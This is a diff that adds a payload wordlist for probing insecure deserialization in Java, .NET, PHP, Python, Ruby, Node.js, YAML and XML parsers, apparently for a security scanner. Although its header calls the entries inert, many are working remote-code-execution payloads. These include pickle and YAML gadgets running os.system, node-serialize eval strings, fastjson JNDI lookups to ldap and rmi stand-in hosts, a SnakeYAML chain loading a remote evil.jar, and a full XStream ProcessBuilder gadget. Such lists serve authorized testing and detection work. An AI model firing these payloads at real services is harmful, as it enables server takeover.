@@ -1,0 +1,137 @@
+# category: deserialization
+# description: Insecure-deserialization probes — Java / PHP / .NET / Python / Ruby / Node.
+# references: ysoserial, phpggc, ysoserial.net, pickle gadgets, Marshal.load, Node serialize-javascript.
+# notes: Inert probe shapes only. The real exploit is a serialized payload produced by a gadget chain.
+
+# ── Java (ysoserial) gadget chain names ─────────────────────────────────
+CommonsCollections1
+CommonsCollections2
+CommonsCollections3
+CommonsCollections4
+CommonsCollections5
+CommonsCollections6
+CommonsCollections7
+CommonsBeanutils1
+Spring1
+Spring2
+ROME
+MozillaRhino1
+MozillaRhino2
+Hibernate1
+Hibernate2
+Vaadin1
+JBoss
+Click1
+Groovy1
+JavassistWeld1
+JSON1
+Jdk7u21
+Jdk8u20
+Clojure
+C3P0
+BeanShell1
+URLDNS
+
+# ── Java serialized blob magic ───────────────────────────────────────────
+\xac\xed\x00\x05
+rO0AB
+# base64 of the above prefix:
+rO0ABXNy
+rO0ABXN0
+
+# ── .NET BinaryFormatter / ObjectStateFormatter (base64 prefixes) ───────
+AAEAAAD/////
+__VIEWSTATE=/wEP
+__VIEWSTATEGENERATOR=
+TypeConfuseDelegate
+ClaimsIdentity
+DataSet
+ObjectDataProvider
+PSObject
+WindowsIdentity
+WindowsClaimsIdentity
+
+# ── PHP unserialize magic ────────────────────────────────────────────────
+O:8:"stdClass":0:{}
+a:1:{s:3:"cmd";s:2:"id";}
+O:4:"User":2:{s:4:"name";s:5:"admin";s:5:"admin";b:1;}
+phar://test.phar/x
+O:21:"PHPMailer\PHPMailer\PHPMailer":0:{}
+O:6:"Monolog\Handler\SyslogUdpHandler":0:{}
+
+# ── Python pickle (opcode prefixes) ──────────────────────────────────────
+cos
+system
+(S'id'
+tR.
+c__builtin__
+eval
+(S'__import__("os").system("id")'
+tR.
+
+# ── Ruby Marshal ─────────────────────────────────────────────────────────
+\x04\bo:
+\x04\b[\x06
+# Universal Deep Cover
+Marshal.load(Base64.decode64(params[:data]))
+BAho
+
+# ── Node.js — node-serialize / vm / Function ─────────────────────────────
+{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}
+_$$ND_FUNC$$_function(){require('child_process').exec('id')}()
+JSON.parse with reviver abuse
+{"__proto__":{"polluted":true}}
+
+# ── YAML (PyYAML load / Ruby Psych) ──────────────────────────────────────
+!!python/object/apply:os.system ["id"]
+!!python/object/new:subprocess.Popen [["id"]]
+!!python/module:os
+!ruby/object:Gem::Installer {}
+!ruby/hash:Gem::Requirement { requirements: }
+!ruby/object:ActionController::Base {}
+!ruby/object:ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy {}
+
+# ── XML XStream / SOAP ───────────────────────────────────────────────────
+<dynamic-proxy><interface>java.lang.Comparable</interface><handler class="java.beans.EventHandler"><target class="java.lang.Runtime"/><action>exec</action><eventPropertyName>id</eventPropertyName></handler></dynamic-proxy>
+
+# ── JSON polyglot probes ─────────────────────────────────────────────────
+{"@type":"java.net.URL","val":"http://x.test/"}
+{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://x.test/x","autoCommit":true}
+{"@type":"com.alibaba.fastjson.annotation.JSONType"}
+
+# ── Jackson / fastjson / Snakeyaml gadget type names ────────────────────
+{"@type":"org.apache.commons.collections.functors.InvokerTransformer","iMethodName":"exec","iParamTypes":["java.lang.String"],"iArgs":["id"]}
+{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":[""],"_name":"x","_tfactory":{}}
+{"@type":"com.fasterxml.jackson.databind.node.POJONode"}
+{"@type":"javax.swing.JEditorPane","page":"http://x.test/"}
+{"@type":"javax.naming.InitialContext","environment":{"java.naming.provider.url":"ldap://x.test/"}}
+{"@type":"com.sun.jndi.rmi.registry.RegistryContext","prvdUrl":"rmi://x.test/x"}
+{"@type":"org.springframework.beans.factory.config.PropertyPathFactoryBean","targetBeanName":"ldap://x.test","propertyPath":"a"}
+!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://x.test/evil.jar"]]]]
+!!com.mchange.v2.c3p0.ComboPooledDataSource
+!!com.mchange.v2.c3p0.WrapperConnectionPoolDataSource
+
+# ── Pickle gadget prefixes (python) ─────────────────────────────────────
+cos\nsystem\n(S'id'\ntR.
+cposix\nsystem\n(S'id'\ntR.
+csubprocess\ncheck_output\n(S'id'\ntR.
+cbuiltins\nexec\n(S'__import__("os").system("id")'\ntR.
+c__builtin__\neval\n(S'__import__("os").system("id")'\ntR.
+
+# ── BinaryFormatter / .NET magic ────────────────────────────────────────
+AAEAAAD/////AQAAAAAAAAAMAgAA
+Dataset base64 signature: PFRhYmxlPjxUYWJsZS9SZWY+
+TypeConfuseDelegate base64: AAEAAAD/////AQAAAAAAAAAEAQAAABwgU3lzdGVt...
+
+# ── Phar-based PHP wrappers (deserialization via stream) ────────────────
+phar:///tmp/exploit.phar
+phar:///var/www/uploads/avatar.phar
+phar:///dev/shm/x.phar
+phar:///proc/self/root/tmp/x.phar
+
+# ── Node-serialize package magic string ─────────────────────────────────
+_$$ND_FUNC$$_function(){require('child_process').exec('id')}()
+_$$ND_FUNC$$_function(){eval(process.argv[2])}()
+
+# ── XStream gadget shapes ───────────────────────────────────────────────
+<map><entry><jdk.nashorn.internal.objects.NativeString><flags>0</flags><value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data"><dataHandler><dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource"><contentType>text/xml</contentType><is class="java.io.SequenceInputStream"><e class="javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator"><iterator class="javax.imageio.spi.FilterIterator"><iter class="java.util.Collections$EmptyIterator"/><next class="java.lang.ProcessBuilder"><command><string>id</string></command><redirectErrorStream>false</redirectErrorStream></next></iterator></e><in class="java.io.ByteArrayInputStream"><buf></buf><pos>0</pos><mark>0</mark><count>0</count></in></is><consumed>false</consumed></dataSource><transferFlavors/></dataHandler><dataLen>0</dataLen></value></jdk.nashorn.internal.objects.NativeString><jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/></entry></map>
